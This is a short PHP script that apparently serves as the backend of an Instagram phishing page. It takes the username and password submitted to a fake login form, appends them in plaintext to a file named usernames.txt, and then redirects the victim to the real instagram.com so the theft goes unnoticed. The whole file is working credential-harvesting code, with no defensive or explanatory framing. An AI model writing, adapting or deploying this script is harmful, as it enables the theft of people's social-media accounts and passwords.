<?php
function redirect($props) {
  $url = explode(": ", $props)[1];
  echo "<script>window.location.replace('$url');</script>";
}


file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "https://instagram.com"; # https://instagram.com
redirect("Location: $url");
exit();
?>
